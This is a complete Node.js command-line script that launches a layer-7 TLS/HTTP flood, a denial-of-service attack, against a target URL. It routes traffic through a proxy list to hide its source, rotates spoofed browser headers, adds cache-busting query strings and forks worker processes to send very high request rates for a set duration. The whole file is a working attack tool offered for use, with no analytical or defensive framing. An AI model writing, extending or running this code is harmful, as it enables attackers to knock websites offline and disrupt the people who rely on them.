const https = require('https');
const http = require('http');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');
const url = require('url');
const tls = require('tls');
const crypto = require('crypto');

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rps: parseInt(process.argv[4]) || 1000000,
    threads: parseInt(process.argv[5]) || 4,
    proxyFile: process.argv[6]
};

if (process.argv.length < 5) {
    console.log("node tls.js <target> <time> <rps> <threads> <proxyFile>");
    process.exit(1);
}

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(line => line.trim());
let proxyIndex = 0;
const getProxy = () => proxies[proxyIndex++ % proxies.length];

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0'
];

const ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
];

const secureOptions = tls.SSL_OP_NO_SSLv2 | tls.SSL_OP_NO_SSLv3 | tls.SSL_OP_NO_TLSv1 | tls.SSL_OP_NO_TLSv1_1;

const parsedTarget = url.parse(args.target);
const isHttps = parsedTarget.protocol === 'https:';
const targetHost = parsedTarget.hostname;
const targetPort = parsedTarget.port || (isHttps ? 443 : 80);
const targetPath = parsedTarget.path || '/';

const generateHeaders = () => {
    return {
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Connection': 'keep-alive'
    };
};

const tlsFlood = () => {
    const proxy = getProxy();
    const [proxyHost, proxyPort] = proxy.split(':');
    
    const options = {
        host: proxyHost,
        port: parseInt(proxyPort),
        method: 'CONNECT',
        path: `${targetHost}:${targetPort}`,
        headers: {
            'Proxy-Authorization': 'Basic ' + Buffer.from('user:pass').toString('base64')
        }
    };
    
    const req = http.request(options);
    
    req.on('connect', (res, socket) => {
        if (res.statusCode === 200) {
            const tlsOptions = {
                socket: socket,
                host: targetHost,
                port: targetPort,
                ciphers: ciphers.join(':'),
                secureOptions: secureOptions,
                rejectUnauthorized: false,
                servername: targetHost,
                ALPNProtocols: isHttps ? ['http/1.1'] : undefined
            };
            
            const tlsSocket = tls.connect(tlsOptions, () => {
                const requestInterval = setInterval(() => {
                    const headers = generateHeaders();
                    const path = targetPath + '?cache=' + Math.random().toString(36).substring(2);
                    
                    const request = isHttps ? https.request({
                        host: targetHost,
                        port: targetPort,
                        path: path,
                        method: 'GET',
                        headers: headers,
                        createConnection: () => tlsSocket,
                        agent: false
                    }) : http.request({
                        host: targetHost,
                        port: targetPort,
                        path: path,
                        method: 'GET',
                        headers: headers,
                        createConnection: () => socket,
                        agent: false
                    });
                    
                    request.on('error', () => {
                        request.destroy();
                    });
                    
                    request.end();
                }, 1000 / (args.rps / args.threads));
                
                socket.on('close', () => {
                    clearInterval(requestInterval);
                    tlsSocket.destroy();
                    tlsFlood();
                });
            });
            
            tlsSocket.on('error', () => {
                tlsSocket.destroy();
                socket.destroy();
            });
        } else {
            socket.destroy();
            tlsFlood();
        }
    });
    
    req.on('error', () => {
        req.destroy();
        tlsFlood();
    });
    
    req.end();
};

if (cluster.isMaster) {
    console.log(`[!] Starting L7 TLS Flood...`);
    console.log(`[>] Target: ${args.target}`);
    console.log(`[>] Time: ${args.time}s`);
    console.log(`[>] RPS: ${args.rps.toLocaleString()}`);
    console.log(`[>] Threads: ${args.threads}`);
    console.log(`[>] Proxies: ${proxies.length}`);
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, args.time * 1000);
} else {
    tlsFlood();
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
